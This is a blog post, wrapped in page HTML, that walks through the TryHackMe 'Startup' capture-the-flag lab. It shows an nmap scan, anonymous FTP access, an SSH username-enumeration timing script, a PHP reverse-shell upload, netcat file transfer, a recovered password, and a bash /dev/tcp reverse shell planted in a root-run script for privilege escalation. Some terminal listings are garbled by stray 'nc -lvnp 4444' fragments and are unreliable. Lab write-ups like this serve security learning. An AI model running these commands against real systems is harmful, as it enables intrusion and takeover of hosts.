@@ -1,0 +1,137 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> TryHackMe 'Startup' lab writeup | Ian Chen </title> <meta name="author" content="Ian Chen"> <meta name="description" content="https://tryhackme.com/room/startup"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%91%A8%F0%9F%8F%BB%E2%80%8D%F0%9F%92%BB&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://www.ianchenn.com/blog/2026/writeup-spicy-hut/"> <script src="/assets/js/theme.js?a81d82887dd692e91686b43de4542f18"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <link defer rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-bundle.min.css" integrity="sha256-yUoNxsvX+Vo8Trj3lZ/Y5ZBf8HlBFsB6Xwm7rH75/9E=" crossorigin="anonymous"> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Ian</span> Chen </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">TryHackMe 'Startup' lab writeup</h1> <p class="post-meta"> Created on May 19, 2026 </p> <p class="post-tags"> <a href="/blog/2026"> <i class="fa-solid fa-calendar fa-sm"></i> 2026 </a>   ·   <a href="/blog/tag/hacking"> <i class="fa-solid fa-hashtag fa-sm"></i> hacking</a>   <a href="/blog/tag/linux"> <i class="fa-solid fa-hashtag fa-sm"></i> linux</a>   ·   <a href="/blog/category/linux"> <i class="fa-solid fa-tag fa-sm"></i> linux</a>   <a href="/blog/category/storage"> <i class="fa-solid fa-tag fa-sm"></i> storage</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="enumeration">Enumeration</h2> <p>Start by scanning the VM ip address</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> spicy.hut
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-05-18 21:27 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>spicy.hut <span class="o">(</span>10.64.132.64<span class="o">)</span>
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp <span class="o">[</span>NSE: writeable]
+| <span class="nt">-rw-r--r--</span>    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.218.192
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Maintenance
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div> <h3 id="checking-ftp">Checking FTP</h3> <p>Then with the results we can see that the server has an anonymous ftp server so we can connect to it:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp spicy.hut
+Connected to spicy.hut.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>spicy.hut:ianchu0317<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|16818|<span class="o">)</span>
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
+<span class="nt">-rw-r--r--</span>    1 0        0          251631 Nov 12  2020 important.jpg
+<span class="nt">-rw-r--r--</span>    1 0        0             208 Nov 12  2020 notice.txt
+226 Directory send OK.
+ftp&gt; get notice.txt
+<span class="nb">local</span>: notice.txt remote: notice.txt
+229 Entering Extended Passive Mode <span class="o">(||</span>|6426|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>notice.txt <span class="o">(</span>208 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">*************************************************************************************************</span>|   208      155.77 KiB/s    00:00 ETA
+226 Transfer complete.
+208 bytes received <span class="k">in </span>00:00 <span class="o">(</span>1.24 KiB/s<span class="o">)</span>
+ftp&gt; get important.jpg
+<span class="nb">local</span>: important.jpg remote: important.jpg
+229 Entering Extended Passive Mode <span class="o">(||</span>|11958|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>important.jpg <span class="o">(</span>251631 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">*************************************************************************************************</span>|   245 KiB  382.43 KiB/s    00:00 ETA
+226 Transfer complete.
+251631 bytes received <span class="k">in </span>00:00 <span class="o">(</span>307.59 KiB/s<span class="o">)</span>
+ftp&gt; <span class="nb">exit
+</span>221 Goodbye.
+</code></pre></div></div> <p>Then after getting the files we can see the content:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>notice.txt
+Whoever is leaving these damn Among Us memes <span class="k">in </span>this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know <span class="nb">who </span>it is, but Maya is looking pretty sus.
+</code></pre></div></div> <p>With this message we know that the server may have an username called <code class="language-plaintext highlighter-rouge">maya</code>.</p> <h3 id="checking-http">Checking HTTP</h3> <p>After checking the HTTP site we see that is a blank site in maintenance</p> <p><img src="/assets/img/spicy-1.png" width="100%" alt="webpage"></p> <p>I ran an dir listing on the page and found that has subdirectory called <code class="language-plaintext highlighter-rouge">/files</code>, and in that page has all the same content as the FTP server.</p> <p>So I’m thinking that maybe this server has a vulnerability in the service that allow us to upload some code(?).</p> <p>After checking in exploit-db.com I found that neither the ftp nor http services has vulnerability. But <code class="language-plaintext highlighter-rouge">OpenSSHd 7.2p2</code> has an vulnerability of username enumeration.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">paramiko</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="n">user</span><span class="o">=</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">user: </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">25000</span>
+<span class="n">ssh</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="nc">SSHClient</span><span class="p">()</span>
+<span class="n">starttime</span><span class="o">=</span><span class="n">time</span><span class="p">.</span><span class="nf">perf_counter</span><span class="p">()</span>
+<span class="n">ssh</span><span class="p">.</span><span class="nf">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="nc">AutoAddPolicy</span><span class="p">())</span>
+<span class="k">try</span><span class="p">:</span>
+        <span class="n">ssh</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">'</span><span class="s">10.64.132.64</span><span class="sh">'</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">user</span><span class="p">,</span>
+        <span class="n">password</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+        <span class="n">endtime</span><span class="o">=</span><span class="n">time</span><span class="p">.</span><span class="nf">perf_counter</span><span class="p">()</span>
+<span class="n">total</span><span class="o">=</span><span class="n">endtime</span><span class="o">-</span><span class="n">starttime</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">total</span><span class="p">)</span>
+</code></pre></div></div> <hr> <h3 id="another-approach">Another approach</h3> <p>What if I upload JS remote code from FTP and execute reverse shell into my machine?</p> <p>Got a reverse shell with uploading <code class="language-plaintext highlighter-rouge">.php</code> file to <code class="language-plaintext highlighter-rouge">/files/ftp</code> with my ip address and connected.</p> <hr> <h2 id="attack">Attack</h2> <h3 id="get-into-server">Get into server</h3> <p>inside the server we see all the files:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@startup:/$ ls -la
+ls -la
+total 100
+drwxr-xr-x  25 root     root      4096 May 19 00:26 .
+drwxr-xr-x  25 root     root      4096 May 19 00:26 ..
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
+drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
+drwxr-xr-x  16 root     root      3560 May 19 00:26 dev
+drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
+drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
+drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
+lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -&gt; boot/initrd.img-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -&gt; boot/initrd.img-4.4.0-190-generic
+drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
+drwx------   2 root     root     16384 Sep 25  2020 lost+found
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
+dr-xr-xr-x 114 root     root         0 May 19 00:25 proc
+-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
+drwx------   4 root     root      4096 Nov 12  2020 root
+drwxr-xr-x  25 root     root       900 May 19 00:46 run
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
+drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
+drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
+dr-xr-xr-x  13 root     root         0 May 19 00:25 sys
+drwxrwxrwt   7 root     root      4096 May 19 01:32 tmp
+drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
+drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
+drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
+lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -&gt; boot/vmlinuz-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinunc -lvnp 4444z.old -&gt; boot/vmlinuz-4.4.0-190-generic
+www-data@startup:/$ 
+</code></pre></div></div> <p>In incidents we see a file called <code class="language-plaintext highlighter-rouge">suspicious.pcapng</code> so we transfer to our machine to analyze it:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># server
+nc 9001 &lt; /incidents/suspicious.pcapng 
+
+# my machine
+nc -lvnp 9001 &gt; suspicious.pcapng
+</code></pre></div></div> <p>And after analyzing we found the user <code class="language-plaintext highlighter-rouge">lennie</code>’s password <code class="language-plaintext highlighter-rouge">c4ntg3t3n0ughsp1c3</code>.</p> <p><img src="/assets/img/spicy-2.png" width="100%" alt="suspicious.pcapng"></p> <h3 id="privilege-escalation">Privilege escalation</h3> <p>While listing the home directory we can see the folder <code class="language-plaintext highlighter-rouge">scripts</code> with root permissions. Inside the folder there are two files:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> scripts
+total 16
+drwxr-xr-x 2 root   root   4nc <span class="nt">-lvnp</span> 4444096 Nov 12  2020 <span class="nb">.</span>
+drwx------ 8 lennie lennie 4096 May 19 02:15 ..
+<span class="nt">-rwxr-xr-x</span> 1 root   root     77 Nov 12  2020 planner.sh
+<span class="nt">-rw-r--r--</span> 1 root   root      1 May 19 02:18 startup_list.txt
+</code></pre></div></div> <p>if we pay attention we can see is executing another file at <code class="language-plaintext highlighter-rouge">/etc/print.sh</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="nv">$LIST</span> <span class="o">&gt;</span> /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+</code></pre></div></div> <p>And the file <code class="language-plaintext highlighter-rouge">/etc/print.sh</code> has <code class="language-plaintext highlighter-rouge">lennie</code>’s write permissions so we could do a reverse shell editing its contents</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.218.192/4444 0&gt;&amp;1
+</code></pre></div></div> <p>and on the machine listen on</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div> <p>After some time we got the shell and grab <code class="language-plaintext highlighter-rouge">root.txt</code>.</p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2026/lvm/">Storage Management</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2026/backblaze/">3 2 1... Backup</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2026/homelab-adguard/">No More Ads</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2026/homelab-immich/">My Self-Hosted Google Photos Alternative</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2026/homelab-nas/">Expanding the Lab</a> </li> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2026 Ian Chen. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> and hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-element-bundle.min.js" integrity="sha256-BPrwikijIybg9OQC5SYFFqhBjERYOn97tCureFgYH1E=" crossorigin="anonymous"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>
